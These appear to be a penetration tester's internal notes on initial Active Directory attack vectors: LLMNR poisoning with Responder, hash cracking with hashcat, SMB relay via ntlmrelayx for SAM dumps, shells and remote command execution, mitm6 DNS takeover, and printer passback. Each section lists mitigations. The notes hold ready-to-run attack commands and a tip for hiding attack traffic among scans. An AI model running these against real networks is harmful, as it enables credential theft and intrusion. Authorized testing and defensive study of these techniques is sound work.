# AD: Initial Attack Vectors
Internal Notes

### LLMNR Poison
- Something like Responder for tooling to perform these attacks.
- MITM based
- Maybe worth running Responder at the same time as Nessus/Nexpose/VAS scans, to obfuscate & utilize traffic that is common.
  - `responder -I {interface} -dwPv`
- Captured Hashes can crack
  - `hashcat -m 5600 crack.txt /usr/share/wordlists/fasttrack.txt` 

#### Remediation
- GPO: DNS Client: Multicast Name Resolution(Botom of List)
- NAC
- Password Policy
___  
### SMB Attacks
- Responder (Relay) - Ensure HTTP and SMB servers off. Should have an Admin Account to be worth it
  - `nmap --script=smb2-security-mode.nse -p445 10.0.0.25`
  - `ntlmrelayx.py `
    - Dumps SAM
  - `ntlmrelayx.py -i`: Interactive(Establish Bind Shell on local address)
    - `nc 127.0.0.1:11000` - `help` list of options that can be performed through the smb client shell
  - `ntlmrelayx.py -c "Bad Stuff command"` - Remote Code Execution through SMB relay 

#### Mitigations
- SMB Signing
- Disable NTLM
- Account tiers
- Local Admin Restrictions

---
### IPv6
- Relay(DNS Takeover) - **MITM6**  (Be careful!) - Short runs
  - `ntlmrelayx.py -6 -t ldaps://{target/DC} -wh  fakewpad.{domain} -l lootXoR`
  - `mitm6 -d {domain}`

#### Mitigations
- Disable IPv6
  - DHCPv6-In (Block)
  - ICMPv6-In (Block)
  - DHCPv6-Out (Block) 
- LDAP Signing
- Disable WPAD (WinHttpAutoProxySVC GPO)
- Prevent Delegation/Impersonation
---
### Passback Attack
[Printer Hacking](https://mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)
Use this to MitM from Printer to SMB/LDAP to capture creds. (May be high priv, or joining privs?)
